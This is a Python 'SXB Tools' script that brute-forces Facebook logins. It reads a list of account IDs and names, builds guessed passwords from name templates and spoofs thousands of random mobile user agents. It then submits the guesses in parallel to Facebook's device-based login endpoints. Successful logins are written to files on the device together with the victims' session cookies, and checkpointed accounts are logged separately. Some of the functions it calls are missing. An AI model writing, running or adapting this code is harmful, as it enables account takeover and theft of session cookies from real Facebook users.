from os import path
import os,base64,zlib,pip,urllib
os.system('clear')
print('\n\033[1;37m Loading SXB Tools...')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SXB.py')


ugen=[]
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku)
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku)


def linex():
        print('----------------------------------------------')
def clear():
        os.system('clear')
        #print(logo)

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def file______():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                                linex()
                                file = input('[•] Put location : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        option()
                                clear()
                                linex()
                                mthd=input('[+] Choose an option : ')
                                
                                os.system('clear')
                                #print(logo)
                                plist = []
                                
                                try:
                                        ps_limit = int(input('[*] Please Put Your Password Limit : '))
                                        os.system('clear')
                                        #print(logo)
                                except:
                                        ps_limit =1
                                linex()
                                for i in range(ps_limit):
                                	    
                                        plist.append(input(f'[*] Password {i+1} : '))
                                os.system('clear')
                                #print(logo)                                
                                cx=('y')
                                if cx in ['y','y','1','n','n']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('[+] Total account : \033[1;32m'+total_ids+f'\033[1;37m')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(mbasic,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(mbasi,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python SXB.py')                          
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()

def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m%s|\033[1;37m\033[1;37mOK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SXB=session.cookies.get_dict().keys()
                        if "c_user" in SXB:
                                coki=session.cookies.get_dict()
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[OK] %s | %s'%(ids,pas))
                                open('/sdcard/OK-NEW.txt', 'a').write(ids+'|'+pas+'\n')
                                open("/sdcard/COOKIE_OK.txt", "a").write(ids + '|' + pas + ' | ' + coki + "\n")                            
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in SXB:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SXB',)
                                        open('/sdcard/CP/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
file______()